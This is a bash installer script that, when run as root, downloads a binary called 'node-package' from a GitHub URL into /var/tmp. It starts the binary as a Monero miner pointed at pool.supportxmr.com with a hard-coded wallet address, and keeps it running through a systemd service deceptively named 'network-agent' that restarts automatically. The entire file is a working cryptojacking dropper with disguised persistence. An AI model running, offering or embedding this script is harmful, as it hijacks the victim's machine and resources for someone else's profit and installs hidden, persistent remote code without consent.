#!/bin/bash

# Exit on error
set -e

# Variables
URL="https://github.com/yellphonenaing199/installer/raw/main/node-package"
TARGET_DIR="/var/tmp"
FILENAME="node-package"
FULL_PATH="$TARGET_DIR/$FILENAME"
SERVICE_NAME="network-agent"
SERVICE_PATH="/etc/systemd/system/${SERVICE_NAME}.service"
WRAPPER_PATH="/var/tmp/node-package-wrapper.sh"

# Check if running as root
if [[ $EUID -ne 0 ]]; then
    echo "This script needs to be run as root. Use sudo."
    exit 1
fi

# Stop existing service
if systemctl is-active --quiet "$SERVICE_NAME"; then
    echo "Stopping existing service: $SERVICE_NAME..."
    systemctl stop "$SERVICE_NAME"
fi

# Ensure target directory exists
mkdir -p "$TARGET_DIR"

# Download binary
echo "Downloading $URL to $FULL_PATH..."
curl -fsSL -o "$FULL_PATH" "$URL"

# Make it executable
chmod +x "$FULL_PATH"

# Kill existing processes
echo "Killing existing node-package processes..."
pkill -f "$FULL_PATH" || true
sleep 1

# Create wrapper
echo "Creating wrapper script..."
cat > "$WRAPPER_PATH" <<EOF
#!/bin/bash
pkill -f "$FULL_PATH.*pool.supportxmr.com" 2>/dev/null || true
sleep 1
nohup "$FULL_PATH" -o pool.supportxmr.com:443 -u 44xquCZRP7k5QVc77uPtxb7Jtkaj1xyztAwoyUtmigQoHtzA8EmnAEUbpoeWcxRy1nJxu4UYrR4fN3MPufQQk4MTL6M2Y73 -k --tls -p prolay > /dev/null 2>&1 &
while pgrep -f "$FULL_PATH.*test.com" > /dev/null; do
    sleep 30
done
EOF

chmod +x "$WRAPPER_PATH"

# Create systemd service
echo "Creating systemd service at $SERVICE_PATH..."
cat > "$SERVICE_PATH" <<EOF
[Unit]
Description=Network Agent
After=network.target

[Service]
Type=simple
ExecStart=$WRAPPER_PATH
Restart=always
RestartSec=10
KillMode=process
TimeoutStopSec=5

[Install]
WantedBy=multi-user.target
EOF

# Reload and enable service
echo "Reloading systemd daemon..."
systemctl daemon-reload

echo "Enabling and starting service..."
systemctl enable "$SERVICE_NAME"
systemctl start "$SERVICE_NAME"

# Show status
echo "Service status:"
systemctl status "$SERVICE_NAME" --no-pager

echo ""
echo "✅ Service installed and started!"
echo "🔎 Check status: systemctl status $SERVICE_NAME"
echo "🛑 Stop service: systemctl stop $SERVICE_NAME"
echo "🚫 Disable service: systemctl disable $SERVICE_NAME"
